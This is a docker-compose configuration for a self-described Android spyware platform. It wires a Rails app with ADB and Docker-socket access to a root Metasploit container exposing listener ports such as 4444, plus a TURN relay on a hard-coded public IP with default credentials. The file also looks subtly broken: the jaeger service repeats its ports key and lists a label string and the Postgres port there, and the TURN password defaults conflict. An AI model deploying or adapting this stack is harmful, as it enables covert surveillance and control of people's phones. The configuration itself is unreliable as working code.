services:
  rails-app:
    image: costincanciu/android-spyware:latest
    depends_on:
      - db
      - metasploit
      - jaeger
      - redis
      - coturn
    env_file:
      - ../.env
      - ../.env.tracing
    ports:
      - "3000:3000"
    volumes:
      - ../:/app/android-spyware
      - //var/run/docker.sock://var/run/docker.sock
    working_dir: /app/android-spyware
    entrypoint: >
      sh -c "rm -f tmp/pids/server.pid && 
             bundle install && 
             rails db:migrate 2>/dev/null || rails db:setup &&
             rails s -b 0.0.0.0 -p 3000"
    tty: true
    mem_limit: 2g
    memswap_limit: 2g
    environment:
      ADB_HOST: host.docker.internal
      JAEGER_HOST: jaeger-collector
      JAEGER_PORT: 6831
      OTEL_TRACES_EXPORTER: jaeger
      POSTGRES_USER: ${POSTGRES_USER:-postgres}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-postgres}
      ANDROIDSPYWARE_DATABASE_HOST: db
      REDIS_URL: redis://redis:6379/1
      TURN_SERVER: turn:coturn:3478
      TURN_USER: ${TURN_USER:-eaglespy}
      TURN_PASSWORD: ${TURN_PASSWORD:-eaglespy_secret}
  jaeger:
    image: jaegertracing/all-in-one:latest
    container_name: jaeger-collector
    environment:
      COLLECTOR_ZIPKIN_HTTP_PORT: 9411
      COLLECTOR_OTLP_ENABLED: "true"
    ports:
      - "6831:6831/udp"
      - "6832:6832/udp"
      - "16686:16686"
      - "14250:14250"
    ports:
      - "127.0.0.1:5432:5432"
      - "com.example.description=Jaeger tracing collector for android-spyware"
  db:
    image: costincanciu/android-spyware-db:latest
    expose:
      - "5432"
    volumes:
      - db:/var/lib/postgresql/data
    environment:
      POSTGRES_HOST_AUTH_METHOD: trust
  metasploit:
    container_name: kali_container
    image: costincanciu/android-spyware-msf:latest
    ports:
    - "2222:2222"
    - "3333:3333"
    - "4444:4444"
    user: root
    volumes:
      - ../files:/root/files
  redis:
    image: redis:7-alpine
    container_name: redis
    expose:
      - "6379"
    volumes:
      - redis_data:/data
    command: redis-server --appendonly yes
  coturn:
    image: coturn/coturn:latest
    container_name: coturn
    ports:
      - "3478:3478"
      - "3478:3478/udp"
    environment:
      TURN_USER: ${TURN_USER:-eaglespy}
      TURN_PASSWORD: ${TURN_PASSWORD:-EagleSpy2024Secure!}
    command: >
      -n
      --log-file=stdout
      --min-port=49152
      --max-port=49200
      --fingerprint
      --lt-cred-mech
      --user=${TURN_USER:-eaglespy}:${TURN_PASSWORD:-EagleSpy2024Secure!}
      --realm=213.91.211.150
      --external-ip=213.91.211.150
      --listening-ip=0.0.0.0
      --no-stun
volumes:
  db:
  redis_data:
